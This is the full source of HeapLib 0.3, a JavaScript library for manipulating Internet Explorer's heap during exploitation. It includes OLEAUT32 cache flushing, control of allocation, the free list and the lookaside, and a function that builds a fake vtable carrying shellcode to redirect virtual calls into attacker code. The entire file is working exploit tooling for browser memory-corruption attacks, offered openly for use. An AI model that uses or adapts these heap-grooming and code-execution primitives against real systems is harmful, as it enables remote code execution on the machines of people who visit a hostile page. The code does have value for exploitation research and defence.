//
//   JavaScript Heap Exploitation library
//   by Alexander Sotirov <asotirov@determina.com>
//  
//   Version 0.3
//
// Copyright (c) 2007, Alexander Sotirov
// All rights reserved.
// 
// The HeapLib library is licensed under a BSD license, the text of which follows:
// 
// Redistribution and use in source and binary forms, with or without
// modification, are permitted provided that the following conditions
// are met:
// 
// 1. Redistributions of source code must retain the above copyright
//    notice, this list of conditions and the following disclaimer.
// 2. Redistributions in binary form must reproduce the above copyright
//    notice, this list of conditions and the following disclaimer in the
//    documentation and/or other materials provided with the distribution.
// 3. Neither the name of Alexander Sotirov nor the name of Determina Inc.
//    may be used to endorse or promote products derived from this software
//    without specific prior written permission.
// 
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
// AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
// IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
// ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE
// LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
// SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
// INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
// CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
// ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
// POSSIBILITY OF SUCH DAMAGE.
//
 
//
// heapLib namespace
//

function heapLib() {
}


//
// heapLib class
//

// heapLib.ie constructor
//
// Creates a new heapLib API object for Internet Explorer. The maxAlloc
// argument sets the maximum block size that can be allocated using the alloc()
// function.
//
// Arguments:
//    maxAlloc - maximum allocation size in bytes (defaults to 65535)
//    heapBase - base of the default process heap (defaults to 0x150000)
//

heapLib.ie = function(maxAlloc, heapBase) {

    this.maxAlloc = (maxAlloc ? maxAlloc : 65535);
    this.heapBase = (heapBase ? heapBase : 0x150000);

    // Allocate a padding string that uses maxAlloc bytes
    this.paddingStr = "AAAA";

    while (4 + this.paddingStr.length*2 + 2 < this.maxAlloc) {
        this.paddingStr += this.paddingStr;
    }
    
    // Create an array for storing references to allocated memory
    this.mem = new Array();

    // Call flushOleaut32() once to allocate the maximum size blocks
    this.flushOleaut32();
}


//
// Outputs a debugging message in WinDbg. The msg argument must be a string
// literal. Using string concatenation to build the message will result in heap
// allocations.
//
// Arguments:
//    msg - string to output
//

heapLib.ie.prototype.debug = function(msg) {
    void(Math.atan2(0xbabe, msg));
}


//
// Enables or disables logging of heap operations in WinDbg.
//
// Arguments:
//    enable - a boolean value, set to true to enable heap logging
//

heapLib.ie.prototype.debugHeap = function(enable) {

    if (enable == true)
        void(Math.atan(0xbabe));
    else
        void(Math.asin(0xbabe));
}


//
// Triggers a breakpoint in the debugger.
//

heapLib.ie.prototype.debugBreak = function(msg) {
    void(Math.acos(0xbabe));
}


//
// Returns a string of a specified length, up to the maximum allocation size
// set in the heapLib.ie constructor. The string contains "A" characters.
//
// Arguments:
//    len - length in characters
//

heapLib.ie.prototype.padding = function(len) {
    if (len > this.paddingStr.length)
        throw "Requested padding string length " + len + ", only " + this.paddingStr.length + " available";

    return this.paddingStr.substr(0, len);
}


//
// Returns a number rounded up to a specified value.
//
// Arguments:
//    num   - integer to round
//    round - value to round to
//

heapLib.ie.prototype.round = function(num, round) {
    if (round == 0)
        throw "Round argument cannot be 0";

    return parseInt((num + (round-1)) / round) * round;
}


//
// Converts an integer to a hex string. This function uses the heap.
//
// Arguments:
//    num   - integer to convert
//    width - pad the output with zeros to a specified width (optional)
//

heapLib.ie.prototype.hex = function(num, width)
{
    var digits = "0123456789ABCDEF";

    var hex = digits.substr(num & 0xF, 1);

    while (num > 0xF) {
        num = num >>> 4;
        hex = digits.substr(num & 0xF, 1) + hex;
    }

    var width = (width ? width : 0);

    while (hex.length < width)
        hex = "0" + hex;

    return hex;
}


//
// Convert a 32-bit address to a 4-byte string with the same representation in
// memory. This function uses the heap.
//
// Arguments:
//    addr - integer representation of the address
//

heapLib.ie.prototype.addr = function(addr) {
    return unescape("%u" + this.hex(addr & 0xFFFF, 4) + "%u" + this.hex((addr >> 16) & 0xFFFF, 4));
}


//
// Allocates a block of a specified size with the OLEAUT32 alloc function.
//
// Arguments:
//    arg - size of the new block in bytes, or a string to strdup
//    tag - a tag identifying the memory block (optional)
//

heapLib.ie.prototype.allocOleaut32 = function(arg, tag) {

    var size;

    // Calculate the allocation size
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;

    // Make sure that the size is valid
    if ((size & 0xf) != 0)
        throw "Allocation size " + size + " must be a multiple of 16";

    // Create an array for this tag if doesn't already exist
    if (this.mem[tag] === undefined)
        this.mem[tag] = new Array();

    if (typeof arg == "string" || arg instanceof String) {
        // Allocate a new block with strdup of the string argument
        this.mem[tag].push(arg.substr(0, arg.length));
    }
    else {
        // Allocate the block
        this.mem[tag].push(this.padding((arg-6)/2));
    }
}


//
// Frees all memory blocks marked with a specific tag with the OLEAUT32 memory
// allocator.
//
// Arguments:
//    tag - a tag identifying the group of blocks to be freed
//

heapLib.ie.prototype.freeOleaut32 = function(tag) {

    delete this.mem[tag];
    
    // Run the garbage collector
    CollectGarbage();
}


//
// The JScript interpreter uses the OLEAUT32 memory allocator for all string
// allocations. This allocator stores freed blocks in a cache and reuses them
// for later allocations. The cache consists of 4 bins, each storing up to 6
// blocks. Each bin holds blocks of a certain size range:
//
//    0 - 32
//    33 - 64
//    65 - 256
//    257 - 32768
//
// When a block is freed by the OLEAUT32 free function, it is stored in one of
// the bins. If the bin is full, the smallest block in the bin is freed with
// RtlFreeHeap() and is replaced with the new block. Chunks larger than 32768
// bytes are not cached and are freed directly.
//
// To flush the cache, we need to free 6 blocks of the maximum size for each
// bin. The maximum size blocks will push out all smaller blocks from the
// cache. Then we allocate the maximum size blocks again, leaving the cache
// empty.
//
// You need to call this function once to allocate the maximum size blocks
// before you can use it to flush the cache.
//

heapLib.ie.prototype.flushOleaut32 = function() {

    this.debug("Flushing the OLEAUT32 cache");

    // Free the maximum size blocks and push out all smaller blocks

    this.freeOleaut32("oleaut32");
    
    // Allocate the maximum sized blocks again, emptying the cache

    for (var i = 0; i < 6; i++) {
        this.allocOleaut32(32, "oleaut32");
        this.allocOleaut32(64, "oleaut32");
        this.allocOleaut32(256, "oleaut32");
        this.allocOleaut32(32768, "oleaut32");
    }
}


//
// Allocates a block of a specified size with the system memory allocator. A
// call to this function is equivalent to a call to HeapAlloc(). If the first
// argument is a number, it specifies the size of the new block, which is
// filled with "A" characters. If the argument is a string, its data is copied
// into a new block of size arg.length * 2 + 6. In both cases the size of the
// new block must be a multiple of 16 and not equal to 32, 64, 256 or 32768.
//
// Arguments:
//    arg - size of the memory block in bytes, or a string to strdup
//    tag - a tag identifying the memory block (optional)
//

heapLib.ie.prototype.alloc = function(arg, tag) {

    var size;

    // Calculate the allocation size
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;

    // Make sure that the size is valid
    if (size == 32 || size == 64 || size == 256 || size == 32768)
        throw "Allocation sizes " + size + " cannot be flushed out of the OLEAUT32 cache";

    // Allocate the block with the OLEAUT32 allocator
    this.allocOleaut32(arg, tag);
}


//
// Frees all memory blocks marked with a specific tag with the system memory
// allocator. A call to this function is equivalent to a call to HeapFree().
//
// Arguments:
//    tag - a tag identifying the group of blocks to be freed
//

heapLib.ie.prototype.free = function(tag) {

    // Free the blocks with the OLEAUT32 free function
    this.freeOleaut32(tag);

    // Flush the OLEAUT32 cache
    this.flushOleaut32();
}


//
// Runs the garbage collector and flushes the OLEAUT32 cache. Call this
// function before before using alloc() and free().
//

heapLib.ie.prototype.gc = function() {

    this.debug("Running the garbage collector");
    CollectGarbage();

    this.flushOleaut32();
}


//
// Adds blocks of the specified size to the free list and makes sure they are
// not coalesced. The heap must be defragmented before calling this function.
// If the size of the memory blocks is less than 1024, you have to make sure
// that the lookaside is full.
//
// Arguments:
//    arg    - size of the new block in bytes, or a string to strdup
//    count  - how many free blocks to add to the list (defaults to 1)
//

heapLib.ie.prototype.freeList = function(arg, count) {

    var count = (count ? count : 1);

    for (var i = 0; i < count; i++) {
        this.alloc(arg);
        this.alloc(arg, "freeList");
    }
    this.alloc(arg);

    this.free("freeList");
}


//
// Add blocks of the specified size to the lookaside. The lookaside must be
// empty before calling this function.
//
// Arguments:
//    arg    - size of the new block in bytes, or a string to strdup
//    count  - how many blocks to add to the lookaside (defaults to 1)
//

heapLib.ie.prototype.lookaside = function(arg, count) {

    var size;

    // Calculate the allocation size
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;

    // Make sure that the size is valid
    if ((size & 0xf) != 0)
        throw "Allocation size " + size + " must be a multiple of 16";

    if (size+8 >= 1024)
        throw("Maximum lookaside block size is 1008 bytes");

    var count = (count ? count : 1);

    for (var i = 0; i < count; i++)
        this.alloc(arg, "lookaside");

    this.free("lookaside");
}


//
// Return the address of the head of the lookaside linked list for blocks of a
// specified size. Uses the heapBase parameter from the heapLib.ie constructor.
//
// Arguments:
//    arg - size of the new block in bytes, or a string to strdup
//

heapLib.ie.prototype.lookasideAddr = function(arg)
{
    var size;

    // Calculate the allocation size
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;

    // Make sure that the size is valid
    if ((size & 0xf) != 0)
        throw "Allocation size " + size + " must be a multiple of 16";

    if (size+8 >= 1024)
        throw("Maximum lookaside block size is 1008 bytes");

    // The lookahead array starts at heapBase + 0x688. It contains a 48 byte
    // structure for each block size + header size in 8 byte increments.

    return this.heapBase + 0x688 + ((size+8)/8)*48;
}


//
// Returns a fake vtable that contains shellcode. The caller should free the
// vtable to the lookaside and use the address of the lookaside head as an
// object pointer. When the vtable is used, the address of the object must be
// in eax and the pointer to the vtable must be in ecx. Any virtual function
// call through the vtable from ecx+8 to ecx+0x80 will result in shellcode
// execution. This function uses the heap.
//
// Arguments:
//    shellcode - shellcode string
//    jmpecx    - address of a jmp ecx or equivalent instruction
//    size      - size of the vtable to generate (defaults to 1008 bytes)
//

heapLib.ie.prototype.vtable = function(shellcode, jmpecx, size) {

    var size = (size ? size : 1008);

    // Make sure the size is valid
    if ((size & 0xf) != 0)
        throw "Vtable size " + size + " must be a multiple of 16";

    if (shellcode.length*2 > size-138)
        throw("Maximum shellcode length is " + (size-138) + " bytes");

    // Build the fake vtable that will go on the lookaside list
    //
    // lookaside ptr  jmp +124  addr of jmp ecx  sub [eax], al*2  shellcode       null
    // 4 bytes        4 bytes   124 bytes        4 bytes          size-138 bytes  2 bytes

    var vtable = unescape("%u9090%u7ceb")   // nop, nop, jmp + 124

    for (var i = 0; i < 124/4; i++)
        vtable += this.addr(jmpecx);

    // If the vtable is the only entry on the lookaside, the first 4 bytes will
    // be 00 00 00 00, which disassembles as two add [eax], al instructions.
    // The jmp ecx trampoline will jump back to the beginning of the vtable and
    // execute the add [eax], al instructions. We need to use two sub [eax], al
    // instructions to fix the heap.

    vtable += unescape("%u0028%u0028") +    // two sub [eax], al instructions
              shellcode + heap.padding((size-138)/2 - shellcode.length);

    return vtable;
}
